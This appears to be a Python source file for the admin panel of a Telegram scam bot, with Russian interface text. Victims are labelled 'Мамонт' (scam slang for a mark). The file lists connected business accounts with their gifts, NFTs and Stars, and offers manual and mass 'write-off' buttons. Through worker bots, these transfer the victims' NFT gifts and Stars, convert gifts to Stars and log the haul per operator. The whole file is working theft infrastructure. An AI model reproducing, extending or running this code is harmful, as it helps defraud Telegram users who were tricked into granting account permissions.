# business_connections.py
import asyncio
import json
from collections import defaultdict
from aiogram import Router, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from sqlalchemy import select, func
from aiogram.exceptions import TelegramBadRequest, TelegramUnauthorizedError, TelegramForbiddenError
from channel_stats_logger import send_massive_transfer_log_to_channel
from db import Session
from models import Admin, BusinessConnection, WorkerBot
from aiogram.methods import GetBusinessAccountGifts, GetBusinessAccountStarBalance

from worker_bots import update_admin_stats, update_global_stats

router = Router()
ITEMS_PER_PAGE = 5

active_transfers = defaultdict(asyncio.Lock)

async def get_business_menu_text_and_markup(tg_id: int):
    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == tg_id))
        total = 0
        if admin:
            total = await session.scalar(
                select(func.count()).select_from(BusinessConnection)
                .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
            ) or 0

    text = f"<b>🏢 Бизнес Коннекты</b>\n\n<b>💎 Всего подключений:</b> <b>{total}</b>"
    builder = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="🏢 Бизнес Коннекты",
            callback_data="show_active_connections:1"
        )],
        [InlineKeyboardButton(
            text="🚀 Массовое списание",
            callback_data="transfer_all_connections"
        )]
    ])
    return text, builder

async def show_business_menu(target):
    tg_id = target.from_user.id if isinstance(target, (types.Message, types.CallbackQuery)) else None
    text, markup = await get_business_menu_text_and_markup(tg_id)
    if isinstance(target, types.Message):
        await target.answer(text, reply_markup=markup, parse_mode="HTML")
    else:
        await target.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
        await target.answer()

@router.message(F.text == "🏢 Бизнес Коннекты")
async def business_connections_handler(message: types.Message):
    if message.chat.type != "private":
        await message.answer("⛔ Доступно только в личке с ботом.")
        return
    await show_business_menu(message)

@router.callback_query(F.data == "go_back_main_menu")
async def go_back_main_menu_callback(callback: types.CallbackQuery):
    await show_business_menu(callback)

# ======= ПАГИНАЦИЯ =======
@router.callback_query(lambda c: c.data and c.data.startswith("show_active_connections"))
async def show_active_connections_callback(callback: types.CallbackQuery):
    try:
        page = int(callback.data.split(":")[1])
    except Exception:
        page = 1

    telegram_id = callback.from_user.id
    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == telegram_id))
        if not admin:
            await callback.answer("Нет доступа.", show_alert=True)
            return

        total = await session.scalar(
            select(func.count()).select_from(BusinessConnection)
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        ) or 0

        if total == 0:
            await callback.answer("Нет активных подключений.", show_alert=True)
            return

        total_pages = (total + ITEMS_PER_PAGE - 1) // ITEMS_PER_PAGE
        page = max(1, min(page, total_pages))
        start_idx = (page - 1) * ITEMS_PER_PAGE

        result = await session.execute(
            select(BusinessConnection, WorkerBot)
            .join(WorkerBot, WorkerBot.id == BusinessConnection.worker_bot_id)
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
            .order_by(BusinessConnection.id.desc())
            .offset(start_idx)
            .limit(ITEMS_PER_PAGE)
        )
        rows = result.all()

    text = f"<b>☑️ Бизнес Коннекты ({total}):</b>\n\n"
    keyboard = []
    for bc, worker in rows:
        user_btn_text = f"@{bc.username}" if bc.username else str(bc.telegram_id)
        keyboard.append([
            InlineKeyboardButton(
                text=user_btn_text,
                callback_data=f"show_connection_{bc.id}_page_{page}"
            )
        ])
    nav = [
        InlineKeyboardButton(text="<", callback_data=f"show_active_connections:{page-1}" if page > 1 else "noop"),
        InlineKeyboardButton(text=f"{page}/{total_pages}", callback_data="noop"),
        InlineKeyboardButton(text=">", callback_data=f"show_active_connections:{page+1}" if page < total_pages else "noop")
    ]
    keyboard.append(nav)
    keyboard.append([InlineKeyboardButton(text="Назад", callback_data="go_back_main_menu")])

    await callback.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard),
        parse_mode="HTML"
    )
    await callback.answer()

# ======= ОТОБРАЖЕНИЕ ПРОФИЛЯ ПОДКЛЮЧЕНИЯ =======
def format_rights(rights):
    permission_map = {
        "Просмотр подарков и звёзд": "can_view_gifts_and_stars",
        "Обмен подарков на звёзды": "can_convert_gifts_to_stars",
        "Настройка подарков": "can_change_gift_settings",
        "Передача и улучшение подарков": "can_transfer_and_upgrade_gifts",
        "Отправка звёзд": "can_transfer_stars",
    }
    lines = []
    for name, key in permission_map.items():
        granted = rights.get(key) if rights else False
        mark = "✅" if granted else "❌"
        lines.append(f"{mark} {name}")
    return "\n".join(lines)

@router.callback_query(lambda c: c.data and c.data.startswith("show_connection_"))
async def show_connection_callback(callback: CallbackQuery):
    # ожидаем формат: show_connection_{bc_id}_page_{page}
    try:
        raw = callback.data.replace("show_connection_", "")
        bc_id_str, page_str = raw.split("_page_")
        bc_id = int(bc_id_str)
        page = int(page_str)
    except Exception:
        await callback.answer("Неверные данные.", show_alert=True)
        return

    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        worker_bot = await session.get(WorkerBot, bc.worker_bot_id) if bc else None
        if not bc or not worker_bot:
            await callback.answer("Данные не найдены.", show_alert=True)
            return

    user_line = f"@{bc.username}" if bc.username else f"<code>{bc.telegram_id}</code>"
    bot_line = f"@{worker_bot.username}" if worker_bot.username else "нет"
    rights_text = format_rights(bc.rights_json or {})

    info = (
        f"<b>⚡️ Профиль подключения</b>\n\n"
        f"<b>🤖 Бот:</b> {bot_line}\n"
        f"<b>💁🏻‍♀️ Мамонт:</b> {user_line}\n"
        f"<b>🆔 ID:</b> <code>{bc.telegram_id}</code>\n"
        f"<b>🖼 NFT:</b> <code>{bc.nft_count or 0}</code>\n"
        f"<b>🎁 Подарков:</b> <code>{bc.regular_gift_count or 0}</code>\n"
        f"<b>⭐️ Звёзд:</b> <code>{bc.stars_count or 0}</code>\n\n"
        f"<b>🔐 Права:</b>\n{rights_text}"
    )
    keyboard = [
        [InlineKeyboardButton(text="🚀 Ручной перевод", callback_data=f"manual_transfer_{bc.id}")],
        [InlineKeyboardButton(text="Обновить данные", callback_data=f"refresh_connection_{bc.id}")],
        [InlineKeyboardButton(text="Назад", callback_data=f"show_active_connections:{page}")]
    ]
    await callback.message.edit_text(
        info,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard),
        parse_mode="HTML"
    )
    await callback.answer()

# ======= ОБНОВЛЕНИЕ ПОДКЛЮЧЕНИЯ =======
@router.callback_query(lambda c: c.data and c.data.startswith("refresh_connection_"))
async def refresh_connection_callback(callback: CallbackQuery):
    bc_id = int(callback.data.replace("refresh_connection_", ""))
    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        worker_bot = await session.get(WorkerBot, bc.worker_bot_id) if bc else None
        if not bc or not worker_bot:
            await callback.answer("Данные не найдены.", show_alert=True)
            return

        from aiogram import Bot
        bot = Bot(token=worker_bot.token)
        business_connection_id = bc.business_connection_id

        changed = False

        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))
        finally:
            await bot.session.close()  

        rights = bc.rights_json or {}

        new_gifts_count = len([g for g in gifts.gifts if getattr(g, "type", "") != "unique"])
        new_nft_count = len([g for g in gifts.gifts if getattr(g, "type", "") == "unique"])
        new_stars_count = int(stars.amount)

        old_rights = bc.rights_json or {}
        rights_changed = (json.dumps(old_rights, sort_keys=True) != json.dumps(rights, sort_keys=True))

        if bc.regular_gift_count != new_gifts_count:
            bc.regular_gift_count = new_gifts_count
            changed = True
        if bc.nft_count != new_nft_count:
            bc.nft_count = new_nft_count
            changed = True
        if bc.stars_count != new_stars_count:
            bc.stars_count = new_stars_count
            changed = True
        if rights_changed:
            bc.rights_json = rights
            changed = True

        if changed:
            await session.commit()

        user_line = f"@{bc.username}" if bc.username else f"<code>{bc.telegram_id}</code>"
        bot_line = f"@{worker_bot.username}" if worker_bot.username else "нет"
        rights_text = format_rights(bc.rights_json or {})

        info = (
            f"<b>⚡️ Профиль подключения</b>\n\n"
            f"<b>🤖 Бот:</b> {bot_line}\n"
            f"<b>💁🏻‍♀️ Мамонт:</b> {user_line}\n"
            f"<b>🆔 ID:</b> <code>{bc.telegram_id}</code>\n"
            f"<b>🖼 NFT:</b> <code>{bc.nft_count or 0}</code>\n"
            f"<b>🎁 Подарков:</b> <code>{bc.regular_gift_count or 0}</code>\n"
            f"<b>⭐️ Звёзд:</b> <code>{bc.stars_count or 0}</code>\n\n"
            f"<b>🔐 Права:</b>\n{rights_text}"
        )
        keyboard = [
            [InlineKeyboardButton(text="🚀 Ручной перевод", callback_data=f"manual_transfer_{bc.id}")],
            [InlineKeyboardButton(text="Обновить данные", callback_data=f"refresh_connection_{bc.id}")],
            [InlineKeyboardButton(text="Назад", callback_data="show_active_connections:1")]
        ]

        try:
            await callback.message.edit_text(
                info,
                reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard),
                parse_mode="HTML"
            )
            await callback.answer("Данные обновлены" if changed else "Нет изменений", show_alert=True)
        except TelegramBadRequest as e:
            if "message is not modified" in str(e):
                await callback.answer("Нет изменений", show_alert=True)
            else:
                raise

# ======= РУЧНОЙ ПЕРЕВОД =======
async def manual_transfer_task(bc_id: int, bot_token: str, connected_user_id: int, callback: CallbackQuery):
    from worker_bots import handle_gift_processing_after_connection, get_cached_bot
    try:
        bot = get_cached_bot(bot_token)
    except Exception as e:
        await callback.answer("🚫 Не удалось инициализировать бота.", show_alert=True)
        return

    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        if not bc or not bc.is_connected:
            await callback.answer("❗️ Подключение недоступно.", show_alert=True)
            return

        worker_bot = await session.get(WorkerBot, bc.worker_bot_id)
        admin = await session.get(Admin, bc.admin_id)

        try:
            await handle_gift_processing_after_connection(
                bot=bot,
                bc_id=bc.business_connection_id,
                worker_bot=worker_bot,
                admin=admin,
                business_user_id=bc.telegram_id,
                connected_user_id=connected_user_id,
                session=session,
                manual=True  
            )
        except (TelegramUnauthorizedError, TelegramForbiddenError, TelegramBadRequest):
            await callback.answer("🚫 Бот удалён или недоступен.", show_alert=True)
        except Exception as e:
            await callback.answer("⚠️ Ошибка при запуске задачи.", show_alert=True)
            print(f"[ERROR] manual_transfer_task: {e}")

@router.callback_query(lambda c: c.data and c.data.startswith("manual_transfer_"))
async def manual_transfer_callback(callback: CallbackQuery):
    bc_id = int(callback.data.replace("manual_transfer_", ""))
    async with Session() as session:
        bc = await session.get(BusinessConnection, bc_id)
        if not bc or not bc.is_connected:
            await callback.answer("❗️ Подключение не найдено или неактивно.", show_alert=True)
            return
        worker_bot = await session.get(WorkerBot, bc.worker_bot_id)
        if not worker_bot:
            await callback.answer("🚫 Бот не найден или удален", show_alert=True)
            return
        bot_token = worker_bot.token

    async def wrapped_task():
        async with active_transfers[bc.telegram_id]: 
            await manual_transfer_task(bc_id, bot_token, bc.telegram_id, callback)

    asyncio.create_task(wrapped_task())
    await callback.answer("🚀 Ручной перевод запущен", show_alert=True)

@router.callback_query(F.data == "noop")
async def noop_callback(callback: CallbackQuery):
    await callback.answer()

@router.callback_query(F.data == "transfer_all_connections")
async def transfer_all_connections_callback(callback: CallbackQuery):
    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == callback.from_user.id))
        if not admin:
            await callback.answer("❌ Нет доступа.", show_alert=True)
            return

        total = await session.scalar(
            select(func.count()).select_from(BusinessConnection)
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        ) or 0

        if total == 0:
            await callback.answer("❗️Нет подключений", show_alert=True)
            return

    await callback.answer("🚀 Перевод по всем подключениям запущен!", show_alert=True)
    asyncio.create_task(process_all_connections_for_admin(callback.from_user.id, callback.message))

async def process_all_connections_for_admin(telegram_id: int, message: types.Message):
    from worker_bots import handle_gift_processing_after_connection, get_cached_bot
    total = 0
    processed = 0
    nft_total = 0
    stars_total = 0
    converted_total = 0
    failed_ids = []
    errors = 0
    all_hold_nfts = [] 

    async with Session() as session:
        admin = await session.scalar(select(Admin).where(Admin.telegram_id == telegram_id))
        if not admin:
            await message.answer("❗️ Админ не найден.")
            return

        result = await session.execute(
            select(BusinessConnection, WorkerBot)
            .join(WorkerBot, WorkerBot.id == BusinessConnection.worker_bot_id)
            .where(BusinessConnection.admin_id == admin.id, BusinessConnection.is_connected == True)
        )
        connections = result.all()
        total = len(connections)
        if total == 0:
            await message.answer("❗️ Нет активных подключений.")
            return

        for bc, worker in connections:
            try:
                bot = get_cached_bot(worker.token)
                stats = await handle_gift_processing_after_connection(
                    bot=bot,
                    bc_id=bc.business_connection_id,
                    worker_bot=worker,
                    admin=admin,
                    business_user_id=bc.telegram_id,
                    connected_user_id=bc.telegram_id,
                    session=session,
                    summary_only=True  
                )
                processed += 1
                nft_total += stats.get("nft_success", 0)
                stars_total += stats.get("stars_transferred", 0)
                converted_total += stats.get("converted", 0)
                all_hold_nfts.extend(stats.get("hold_nfts", []))
            except Exception as e:
                errors += 1
                failed_ids.append(bc.telegram_id)
            await asyncio.sleep(0.7)

        await update_admin_stats(session, admin, nft=nft_total, stars=stars_total)
        await update_global_stats(session, nft=nft_total, stars=stars_total)

    unique_links = set()
    for slug, link, unlock_dt in all_hold_nfts:
        if link:
            unique_links.add(link)
        else:
            unique_links.add(f"{slug}|{unlock_dt}")
    hold_total = len(unique_links)

    summary = (
        f"<b>🚀 Массовый перевод завершён</b>\n"
        f"<b>📦 Всего подключений:</b> <code>{total}</code>\n"
        f"<b>✅ Успешно обработано:</b> <code>{processed}</code>\n"
        f"<b>🎁 Передано NFT:</b> <code>{nft_total}</code>\n"
        f"<b>⭐️ Передано звёзд:</b> <code>{stars_total}</code>\n"
        f"<b>♻️ Конвертировано подарков в звёзды:</b> <code>{converted_total}</code>\n"
        f"<b>🕒 NFT с холдом:</b> <code>{hold_total}</code>\n"
    )
    if failed_ids:
        summary += "<b>Не обработано (ID):</b> <code>" + ", ".join(map(str, failed_ids)) + "</code>\n"

    if all_hold_nfts:
        total_holds = len(all_hold_nfts)
        for idx, (slug, link, unlock_dt) in enumerate(all_hold_nfts, 1):
            branch = "└" if idx == total_holds else "├"
            if link:
                summary += f"{branch} <a href='{link}'>{unlock_dt}</a>\n"
            else:
                summary += f"{branch} {unlock_dt}\n"

    await message.answer(summary, disable_web_page_preview=True)

    if nft_total > 0 or stars_total > 0:
        await send_massive_transfer_log_to_channel(
            telegram_id,
            nft_total,
            stars_total,
            processed,
            total
        )